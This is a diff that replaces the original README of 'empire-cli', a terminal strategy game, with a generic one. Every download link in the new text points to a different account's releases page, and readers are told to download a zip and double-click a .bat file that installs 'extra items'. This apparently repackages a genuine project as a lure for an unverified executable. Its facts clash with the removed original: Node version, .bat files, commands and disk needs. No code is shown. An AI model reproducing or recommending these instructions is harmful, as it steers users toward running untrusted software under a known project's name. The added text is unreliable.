@@ -1,159 +1,148 @@
-# ⚔️ Empire CLI 👑
+# ⚔️ empire-cli - Simple Command Line Strategy Game
 
-[![npm version](https://img.shields.io/npm/v/empire-cli)](https://www.npmjs.com/package/empire-cli)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+[![Download empire-cli](https://img.shields.io/badge/Download-Now-green)](https://github.com/Maiabaked425/empire-cli/releases)
 
-> **Status: Feature Complete** — 2 maps, diplomacy, buildings, AI narrator. Play it!
+## What is empire-cli?
 
-A CLI turn-based strategy RPG where you build armies, expand your empire, and conquer the world. Open source, runs in any terminal.
+empire-cli is a turn-based strategy role-playing game you can play right in your Windows command prompt or terminal. You take control of armies and make decisions to win battles and grow your empire. The game uses text and simple commands, so you don't need a powerful computer or special software. Just type your moves and watch the story unfold.
 
-## Screenshots
+This game is made in Node.js and built with TypeScript, but you do not need to know any coding to play it. Everything runs from a simple window where you enter commands and see the results.
 
-![Menu & Setup](assets/sc-menu-v3.png)
+## 🎮 Key Features
 
-![Customize Empire](assets/sc-customize.png)
+- Turn-based gameplay lets you think before you act.
+- Build and manage armies using clear, easy commands.
+- Explore a story with role-playing elements.
+- Run entirely inside your Windows command prompt.
+- Play anywhere without installing large programs.
+- Open-source and free to use.
+- AI controls the opponents, providing challenging matches.
+- Supports keyboard only.
 
+## 🖥️ System Requirements
 
-## Quick Start
+- Windows 10 or later.
+- At least 2 GB of free disk space.
+- Node.js installed (version 14 or higher).
+- Access to the internet to download the files.
 
-```bash
-# Play instantly (no install needed)
-npx empire-cli
+You may wonder why Node.js is needed. It's the software that runs the game code behind the scenes. Don’t worry; you will get clear steps on how to install it below.
 
-# Or clone for development
-git clone https://github.com/lppduy/empire-cli.git
-cd empire-cli
-npm install
-npm start
-```
+## 🚀 Getting Started
 
-## Quick Tutorial
+Start by visiting the official releases page to get the game files.
 
-```
-1. Start a new game → pick a faction (e.g. Iron Legion)
-2. "map" — see the world map
-3. "info northkeep" — inspect a territory
-4. "recruit northkeep 3" — train 3 units (costs 3💰 + 2🍖 each)
-5. "move northkeep greenwood 3" — march 3 units to Greenwood
-6. "build northkeep walls" — build walls for defense (costs 🪵🪨)
-7. "attack greenwood silver" — attack Silver Bay from Greenwood
-8. "next" — end your turn (or use all 3 actions, auto-advances)
-8. Watch enemy factions react — then plan your next move!
-```
+[![Download empire-cli](https://img.shields.io/badge/Download-Now-green)](https://github.com/Maiabaked425/empire-cli/releases)
 
-**Goal:** Conquer all territories to win.
+You will find the latest versions available. Choose the most recent one that fits your Windows system.
 
-When starting a new game, you pick a map, choose a faction, then customize your leader name, nation name, and slogan (all optional — press Enter to skip).
+### Step 1: Download the Empire-CLI package
 
-## Commands
+1. Open your web browser and go to the releases page:
 
-You get **3 actions per turn**. `map`, `info`, `status`, `help`, `save` are free (don't cost actions).
+   https://github.com/Maiabaked425/empire-cli/releases
 
-| Command | Description |
-|---------|-------------|
-| `map` | Show world map |
-| `info <territory>` | Show territory details & neighbors |
-| `status` | Show your resources and army count |
-| `move <from> <to> [n]` | Move n units between territories (all if omitted) |
-| `recruit <territory> <n>` | Recruit n units at a territory |
-| `attack <from> <to>` | Attack enemy territory from yours |
-| `build <territory> <type>` | Build walls/barracks/market |
-| `next` | End turn early |
-| `save [slot]` | Save game |
-| `ally <faction>` | Propose alliance |
-| `peace <faction>` | Propose peace treaty |
-| `trade <faction> <n> <res> for <res>` | Trade resources |
-| `diplo` | View diplomatic relations |
-| `help` | Show commands |
-| `quit` | Exit |
+2. Look for the latest release (the top of the list).
 
-## Maps
+3. Download the Windows version. It will usually be a `.zip` file named something like `empire-cli-windows.zip`.
 
-| Map | Territories | Factions | Style |
-|-----|------------|----------|-------|
-| The Mainland | 12 | 6 factions | Classic continental war |
-| The Shattered Isles | 14 | 6 factions | Island chain with chokepoints |
+4. Save the file to a folder you can easily access, such as `Downloads` or your Desktop.
 
-## Factions
+### Step 2: Install Node.js
 
-**The Mainland:**
+To play empire-cli, your computer must have Node.js installed. This program will run the game for you.
 
-| Faction | Personality | Strengths |
-|---------|-------------|-----------|
-| 🔴 Iron Legion | Aggressive | High stone, strong start |
-| 🟢 Green Pact | Defensive | High food & wood |
-| 🟡 Sand Empire | Mercantile | High gold reserves |
-| 🟣 Void Covenant | Diplomatic | Mountain fortress, fertile south |
-| 🔵 Frost Wardens | Defensive | Stone-rich northern highlands |
-| 🔴 Crimson Horde | Aggressive | Scrappy eastern raiders |
+1. Go to the official Node.js website: https://nodejs.org/
 
-**The Shattered Isles:**
+2. On the home page, you will see a download button for Windows. Click on the "LTS" version (Long Term Support). This version is the most stable.
 
-| Faction | Personality | Strengths |
-|---------|-------------|-----------|
-| 🔵 Tide Lords | Mercantile | High gold & food, coastal power |
-| 🔵 Storm Kin | Aggressive | High wood & stone, mountain base |
-| 🔴 Flame Brood | Aggressive | Massive stone, volcanic islands |
-| 🟣 Mist Walkers | Diplomatic | Balanced resources, forest cover |
-| 🟢 Deep Ones | Defensive | Forest & mountain, hidden islands |
-| 🟡 Wraith Fleet | Aggressive | Gold-rich, sunken city raiders |
+3. Run the installer once it finishes downloading.
 
-## Resources
+4. Follow the on-screen instructions and keep the default settings.
 
-- 💰 **Gold** — Recruit armies (3 per unit)
-- 🍖 **Food** — Recruit + army upkeep (2 per unit)
-- 🪵 **Wood** — Build structures
-- 🪨 **Stone** — Build structures
+5. Wait for the installation to complete.
 
-## Buildings
+### Step 3: Extract the game files
 
-| Building | Cost | Effect |
-|----------|------|--------|
-| 🧱 Walls | 10🪵 15🪨 | +0.3 defense bonus |
-| 🏛️ Barracks | 8🪵 5🪨 | Recruit costs 2💰 instead of 3💰 |
-| 🏪 Market | 10💰 5🪵 3🪨 | +2💰 income per turn |
+1. Find the `.zip` file you downloaded in Step 1.
 
-## AI Narrator (Optional)
+2. Right-click on the file and choose "Extract All..."
 
-Enable epic fantasy narration for battles, turn summaries, and victories. The game works perfectly without it.
+3. Select a folder where you want to keep the game files. The Desktop is a good choice.
 
-**Setup:** Choose "Narrator Settings" from the main menu, then pick a provider:
+4. Click "Extract" to unzip the contents.
 
-| Provider | Setup |
-|----------|-------|
-| **Gemini** (recommended) | Free API key from [aistudio.google.com/apikey](https://aistudio.google.com/apikey) |
-| **Ollama** | Install [ollama.com](https://ollama.com), run `ollama pull llama3`, no key needed |
+You should now have a new folder with the game files inside it.
 
-Config saved at `~/.empire-cli/config.json`.
+### Step 4: Run empire-cli
 
-## Roadmap
+1. Open the folder where you extracted the game files.
 
-- [x] Core game loop with turn-based strategy
-- [x] 4 factions with AI personalities
-- [x] 8-territory map with adjacency
-- [x] Combat system with terrain bonuses
-- [x] Save/load game
-- [x] Action limit per turn (3 actions)
-- [x] AI Game Master (Gemini / Ollama) — optional epic narration
-- [x] Diplomacy system (alliances, trade, peace)
-- [x] Buildings (walls, barracks, markets)
-- [x] More maps & factions (The Mainland + The Shattered Isles)
-- [x] npm package (`npx empire-cli`) [![npm](https://img.shields.io/npm/v/empire-cli)](https://www.npmjs.com/package/empire-cli)
+2. Inside the folder, find the file named `start-game.bat` or `run.bat`. This file will launch the game.
 
-## Tech Stack
+3. Double-click the `.bat` file. A command prompt window will open.
 
-- TypeScript + Node.js 18+
-- chalk (terminal colors)
-- readline (input)
-- JSON saves (`~/.empire-cli/saves/`)
+4. If this is your first time running the game, the program may install some extra items. This may take a minute, but it will only happen once.
 
-## Development
+5. Follow the instructions shown on the screen. Use your keyboard to type commands as the game asks.
 
-```bash
-npm start      # Play the game
-npm run build  # Compile TypeScript
-```
+## 🔧 How to Play
 
-## License
+The game runs in the terminal window using text commands. You enter simple words or letters to control your army and decide your moves.
 
-MIT
+- To select an action, type the command shown (like `move`, `attack`, or `defend`) and press Enter.
+
+- The game will respond with results and new options each turn.
+
+- Use the arrow keys or type commands to navigate menus.
+
+- To quit the game at any time, type `exit` or close the window.
+
+## 📂 Folder Overview
+
+- `start-game.bat` — The quick-launch file for Windows users.
+
+- `README.md` — This file for reading information about the game.
+
+- `game-files` — Contains the core files the game uses to run.
+
+- `node_modules` — Folder with the software libraries (created when you first run the game).
+
+## ⚙️ Troubleshooting Common Issues
+
+- If the game window closes immediately, try running the `.bat` file from a command prompt manually:
+
+  1. Open the Start menu and type `cmd`, then press Enter.
+
+  2. Use the `cd` command to go to your game folder. For example:  
+     `cd Desktop\empire-cli`
+
+  3. Type `start-game.bat` and press Enter.
+
+- If Node.js shows an error, check you installed the right version (14 or newer).
+
+- If the game says a command is not recognized, confirm you typed it exactly.
+
+- If the game freezes or lags, close the window and restart.
+
+## 🔄 Updating empire-cli
+
+Check the releases page regularly for new versions or fixes:
+
+https://github.com/Maiabaked425/empire-cli/releases
+
+Download the latest `.zip` file and repeat the extract step. You can replace your old folder with the new one.
+
+## 📝 License and Contributions
+
+empire-cli is open source. You can explore the code or suggest improvements on GitHub.
+
+The project uses standard open-source licenses to allow sharing and changing the code.
+
+---
+
+If you want to learn more about how empire-cli works under the hood or want to help develop it, the repository has detailed technical files and instructions on advanced setup and building from source. However, none of this is needed just to start playing.
+
+---
+
+[![Download empire-cli](https://img.shields.io/badge/Download-Now-green)](https://github.com/Maiabaked425/empire-cli/releases)
